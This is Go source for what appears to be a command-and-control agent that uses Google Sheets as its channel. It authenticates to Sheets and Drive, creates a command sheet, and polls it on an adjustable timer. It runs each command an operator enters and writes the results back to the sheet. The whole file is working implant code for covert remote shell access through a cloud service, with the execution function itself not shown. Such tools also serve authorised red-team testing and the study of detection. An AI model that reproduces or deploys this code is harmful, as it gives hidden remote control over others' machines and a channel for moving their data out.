package C2

import (
	"GC2-sheet/internal/authentication"
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"time"
)

func Run() {

	// Perform sheet authentication
	_, clientSheet := authentication.AuthenticateSheet(configuration.GetOptionsCredential())

	// Create new configuration
	spreadSheet := &configuration.SpreadSheet{}

	// Set spreadSheet ID
	spreadSheet.SpreadSheetId = configuration.GetOptionsSheetId()

	// Set drive ID
	spreadSheet.DriveId = configuration.GetOptionsDriveId()

	// Get new sheet name to create
	newSheetName := generateNewSheetName()
	// Set sheet name
	spreadSheet.CommandSheet.Name = newSheetName

	// Set default ticker duration
	spreadSheet.CommandSheet.Ticker = 10

	// Set default range for the ticker configuration
	spreadSheet.CommandSheet.RangeTickerConfiguration = "E2"

	addNewEmptyCommand(spreadSheet)

	// Perform drive authentication
	_, clientDrive := authentication.AuthenticateDrive(configuration.GetOptionsCredential())

	// Creating new sheet inside spreadsheet on program start
	createSheet(clientSheet, spreadSheet)

	// Creating ticker
	ticker := time.NewTicker(time.Duration(spreadSheet.CommandSheet.Ticker) * time.Second)

	for {
		select {
		case <-ticker.C:
			go func() {
				// Get last command in the pool
				lastCommand := getLastCommand(spreadSheet)

				commandToExecute := ""

				// If last command has empty Input we need to get the new command from the spreadsheet
				if lastCommand.Input == "" {
					// Retrieve last command from the sheet
					newTicker := 0
					// command to execute (can be ""), and delay for the ticker
					commandToExecute, newTicker = readSheet(clientSheet, spreadSheet)

					// Update ticker if value has changed
					if newTicker != spreadSheet.CommandSheet.Ticker && newTicker != 0 {
						spreadSheet.CommandSheet.Ticker = newTicker
						utils.LogDebug("Updated ticker delay")
						ticker.Reset(time.Duration(spreadSheet.CommandSheet.Ticker) * time.Second)
					}
				}

				// If no command end the thread
				if commandToExecute == "" {
					utils.LogDebug("No new command")
					return
				}

				utils.LogDebug("New command: " + commandToExecute)

				// Set new retrieved command
				lastCommand.Input = commandToExecute

				// Create new empty command before performing the current one (to avoid deadlock on command execution)
				addNewEmptyCommand(spreadSheet)

				// Execute the command
				execute(spreadSheet, clientDrive, lastCommand, commandToExecute)

				// Write result on spreadsheet (result is stored in the current command structure)
				writeSheet(clientSheet, spreadSheet, lastCommand)

			}()
		}
	}

}

// get last command form the command list
func getLastCommand(spreadSheet *configuration.SpreadSheet) *configuration.Commands {

	if len(spreadSheet.CommandSheet.CommandsExecution) == 0 {
		return nil
	}

	return &spreadSheet.CommandSheet.CommandsExecution[len(spreadSheet.CommandSheet.CommandsExecution)-1]

}

// create a new empty command and append it to command list
func addNewEmptyCommand(spreadSheet *configuration.SpreadSheet) {

	lastCommand := getLastCommand(spreadSheet)

	command := configuration.Commands{}

	// if not command, we need to inizializate the first one
	if lastCommand == nil {
		// Creating first command
		command = configuration.Commands{
			RangeIn:  "A",
			RangeOut: "B",
			RangeLog: "C",
			RangeId:  1,
			Input:    "",
			Output:   "",
		}
	} else {

		// Creating new empty command
		command = configuration.Commands{
			RangeIn:  "A",
			RangeOut: "B",
			RangeLog: "C",
			RangeId:  lastCommand.RangeId + 1,
			Input:    "",
			Output:   "",
		}
	}

	// Add command to pool
	spreadSheet.CommandSheet.CommandsExecution = append(spreadSheet.CommandSheet.CommandsExecution, command)

}
